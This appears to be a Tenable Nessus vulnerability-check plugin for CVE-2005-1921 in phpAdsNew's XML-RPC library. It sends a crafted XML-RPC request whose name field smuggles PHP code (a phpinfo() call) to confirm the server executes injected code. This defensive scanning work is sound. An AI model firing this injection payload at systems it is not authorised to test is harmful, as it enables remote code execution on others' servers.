#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description) {
  script_id(20180);
  script_version("1.20");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);

  script_name(english:"phpAdsNew XML-RPC Library Remote Code Injection");
  script_summary(english:"Checks for remote code injection vulnerability in phpAdsNew XML-RPC library");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to arbitrary
code execution." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running phpAdsNew, an open source ad
server written in PHP. 

The version of phpAdsNew installed on the remote host allows attackers
to execute arbitrary PHP code subject to the privileges of the web
server user id due to a flaw in its bundled XML-RPC library." );
  # http://web.archive.org/web/20101223094048/http://www.gulftech.org/?node=research&article_id=00087-07012005
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e698f657" );
  # http://web.archive.org/web/20060615161153/http://phpadsnew.com/two/nucleus/index.php?itemid=45
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cadcbe45" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpAdsNew 2.0.5 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"metasploit_name", value:'PHP XML-RPC Arbitrary Code Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/29");
 script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpadsnew:phpadsnew");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {
  # Check whether the script exists.
  r = http_send_recv3(method:"GET",item:dir + "/adxmlrpc.php", port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("<methodResponse>" >< res) {
    # Try to exploit the flaw to run phpinfo().
    postdata =
      '<?xml version="1.0"?>' +
      "<methodCall>" +
      "<methodName>system.listMethods</methodName>" +
        "<params>" +
          "<param><value><name>','')); phpinfo();exit;/*</name></value></param>" +
        "</params>" +
      "</methodCall>";

    r = http_send_recv3(method:"POST", item: dir + "/adxmlrpc.php", version: 11, port: port,
      add_headers: make_array("Content-Type", "text/xml"),
      data: postdata );
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< res) {
      security_report_v4(port:port, extra:res, severity:SECURITY_HOLE);
      exit(0);
    }
  }
}
